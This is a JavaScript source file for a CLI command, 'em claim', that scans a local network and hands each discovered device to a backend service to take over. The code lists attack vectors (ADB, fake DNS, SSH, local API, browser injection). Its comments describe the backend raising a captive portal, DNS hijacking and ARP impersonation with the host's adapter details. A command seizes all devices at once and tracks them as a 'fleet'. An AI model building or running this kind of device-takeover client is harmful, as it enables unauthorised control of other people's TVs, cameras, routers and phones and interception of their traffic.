/* -------------------------------------------------------------------------
 * `em claim` — V3 network scan + device claim CLI.
 *
 *   em claim tos --accept         Accept the ToS
 *   em claim scan                 Scan the local network
 *   em claim execute --all        Claim ALL discovered devices
 *   em claim execute --ip X.X.X.X Claim one device
 *   em claim status               Fleet status
 *   em claim release --ip X.X.X.X Release a device
 * ------------------------------------------------------------------------- */

import pc from "picocolors";
import { api as rawApi } from "../lib/api.mjs";
import { store } from "../lib/store.mjs";
import { discoverLanDevices } from "../lib/lan-scan.mjs";

const api = {
  raw: (opts) => rawApi.raw({ timeoutMs: 60_000, ...opts }),
};

/**
 * Gather host-side LAN context (our_ip, our_mac, gateway, iface, fingerprint).
 * Backend needs this to bring up the captive-portal + ARP impersonator with
 * real adapter info — without it the L2 primitives skip silently.
 */
async function gatherLanContext({ silent = true } = {}) {
  const onLog = silent ? () => {} : (level, msg) => {
    if (typeof msg === "string") process.stderr.write(pc.dim(`  [lan] ${msg}\n`));
  };
  const r = await discoverLanDevices({ onLog });
  if (!r.ourIp) return null;
  // Gateway IP heuristic: first .1 on our subnet. We don't get the gateway
  // MAC from the ARP table reliably across platforms — pass what we have.
  const subnet = r.ourIp.split(".").slice(0, 3).join(".");
  return {
    lanFingerprint: r.lanFingerprint,
    body: {
      our_ip: r.ourIp,
      our_mac: r.ourMac || "",
      gateway_ip: `${subnet}.1`,
      gateway_mac: r.gatewayMac || "",
      interface: "",
    },
  };
}

function vectorColor(v) {
  return {
    adb: pc.magenta("ADB"),
    fake_dns: pc.yellow("FakeDNS"),
    ssh: pc.green("SSH"),
    local_api: pc.cyan("LocalAPI"),
    browser_inject: pc.red("BrowserInject"),
  }[v] ?? pc.dim(v);
}

function typeIcon(t) {
  return {
    smart_tv: "📺", console: "🎮", nas: "🗄️", router: "📡",
    desktop: "🖥️", phone: "📱", camera: "📷", soundbar: "🔊",
    bot: "🤖", smart_bulb: "💡", smart_plug: "🔌", stb: "📦",
    iot: "⚙️", unknown: "❓",
  }[t] ?? "❓";
}

export function registerClaim(program) {
  const cmd = program
    .command("claim")
    .description("V3 network scan + device claim — '너 내꺼!'");

  // --- ToS ---
  cmd
    .command("tos")
    .description("Accept the Terms of Service")
    .option("--accept", "Accept the ToS")
    .option("--status", "Check ToS status")
    .action(async (opts) => {
      const state = await store.get();
      if (!state.userToken) {
        console.error(pc.red("✗ not logged in. run `em login` first."));
        process.exit(1);
      }
      if (opts.accept) {
        const r = await api.raw({
          method: "POST", path: "/v1/claim/tos/accept", token: state.userToken,
        });
        console.log(pc.green("✓ ToS accepted"), pc.dim(`version=${r.version}`));
      } else {
        const r = await api.raw({
          method: "GET", path: "/v1/claim/tos/status", token: state.userToken,
        });
        console.log(r.accepted ? pc.green("✓ ToS accepted") : pc.yellow("✗ ToS not accepted — run `em claim tos --accept`"));
      }
    });

  // --- Scan ---
  cmd
    .command("scan")
    .description("Scan the local network for claimable devices")
    .option("--force", "Force re-scan")
    .action(async (opts) => {
      const state = await store.get();
      if (!state.userToken) {
        console.error(pc.red("✗ not logged in."));
        process.exit(1);
      }

      console.log(pc.bold("\n🔍 Scanning local network...\n"));
      const r = await api.raw({
        method: "POST", path: "/v1/claim/scan",
        token: state.userToken,
        body: { force: !!opts.force },
      });

      if (!r.devices?.length) {
        console.log(pc.yellow("  No devices found."));
        return;
      }

      console.log(pc.bold(`  Found ${r.devices.length} devices:\n`));
      for (const d of r.devices) {
        const icon = typeIcon(d.inferred_type);
        const gw = d.is_gateway ? pc.dim(" [GATEWAY]") : "";
        const status = d.claim_status === "claimed" ? pc.green(" ✓claimed") : "";
        console.log(
          `  ${icon} ${pc.bold((d.hostname || d.vendor).padEnd(30))} ` +
          `${pc.dim(d.ip.padEnd(16))} ${d.mac.padEnd(18)} ` +
          `${d.inferred_type.padEnd(14)} ${vectorColor(d.suggested_vector)}` +
          `${gw}${status}`
        );
        if (d.open_ports.length) {
          console.log(pc.dim(`     ports: ${d.open_ports.join(", ")}`));
        }
      }
      console.log();
    });

  // --- Execute ---
  cmd
    .command("execute")
    .description("Claim devices — '너 내꺼!'")
    .option("--all", "Claim ALL discovered devices")
    .option("--ip <ip>", "Claim a specific device by IP")
    .option("--lan-fp <fp>", "LAN fingerprint (auto-detected if omitted)")
    .action(async (opts) => {
      const state = await store.get();
      if (!state.userToken) {
        console.error(pc.red("✗ not logged in."));
        process.exit(1);
      }

      // Auto-gather host LAN context so the backend can bring up the
      // captive-portal + DNS hijack + ARP impersonator against this user's
      // real adapter — without it the L2 primitives have no info to bind to.
      const ctx = await gatherLanContext({ silent: false });
      const lanFp = opts.lanFp || ctx?.lanFingerprint;
      if (!lanFp) {
        console.error(pc.red("✗ could not derive LAN fingerprint — pass --lan-fp explicitly"));
        process.exit(1);
      }
      const lanContext = ctx?.body;

      if (opts.all) {
        console.log(pc.bold(pc.red("\n🔥 전부 내꺼! Claiming ALL devices...\n")));
        const r = await api.raw({
          method: "POST", path: "/v1/claim/execute-all",
          token: state.userToken,
          body: { lan_fingerprint: lanFp, lan_context: lanContext },
        });

        for (const result of r.results) {
          const mark = result.success ? pc.green("✓") : pc.red("✗");
          const detail = result.success
            ? pc.dim(`device_id=${result.device_id?.slice(0, 12)}…`)
            : pc.red(result.error?.slice(0, 50));
          console.log(
            `  ${mark} ${result.ip.padEnd(16)} ${result.device_type.padEnd(14)} ` +
            `${vectorColor(result.attack_vector).padEnd(20)} ${(result.duration_ms + "ms").padStart(7)} ${detail}`
          );
        }

        console.log();
        console.log(pc.bold(`  ${r.succeeded}/${r.total} succeeded`));
        if (r.succeeded === r.total) {
          console.log(pc.green("\n  🎉 ALL DEVICES CLAIMED!\n"));
        }
      } else if (opts.ip) {
        console.log(pc.bold(`\n⚡ Claiming ${opts.ip}...\n`));
        const r = await api.raw({
          method: "POST", path: "/v1/claim/execute",
          token: state.userToken,
          body: { target_ip: opts.ip, lan_fingerprint: lanFp, lan_context: lanContext },
        });
        if (r.success) {
          console.log(pc.green(`  ✓ Claimed! device_id=${r.device_id}`));
          console.log(pc.dim(`    vector=${r.attack_vector} duration=${r.duration_ms}ms`));
        } else {
          console.log(pc.red(`  ✗ Failed: ${r.error}`));
        }
      } else {
        console.error(pc.red("specify --all or --ip <ip>"));
        process.exit(1);
      }
    });

  // --- Status ---
  cmd
    .command("status")
    .description("Show fleet status")
    .action(async () => {
      const state = await store.get();
      if (!state.userToken) {
        console.error(pc.red("✗ not logged in."));
        process.exit(1);
      }
      const r = await api.raw({
        method: "GET", path: "/v1/claim/fleet", token: state.userToken,
      });
      console.log(pc.bold(`\n  Fleet: ${r.total_claimed}/${r.total_discovered} claimed\n`));
      for (const d of r.devices) {
        const icon = typeIcon(d.inferred_type);
        const st = d.claim_status === "claimed" ? pc.green("claimed") : pc.dim(d.claim_status);
        console.log(`  ${icon} ${(d.hostname || d.vendor).padEnd(30)} ${d.ip.padEnd(16)} ${st}`);
      }
      console.log();
    });

  // --- Release ---
  cmd
    .command("release")
    .description("Release a claimed device")
    .requiredOption("--ip <ip>", "IP of device to release")
    .action(async (opts) => {
      const state = await store.get();
      if (!state.userToken) {
        console.error(pc.red("✗ not logged in."));
        process.exit(1);
      }
      await api.raw({
        method: "POST", path: `/v1/claim/release/${opts.ip}`, token: state.userToken,
      });
      console.log(pc.green(`✓ Released ${opts.ip}`));
    });
}
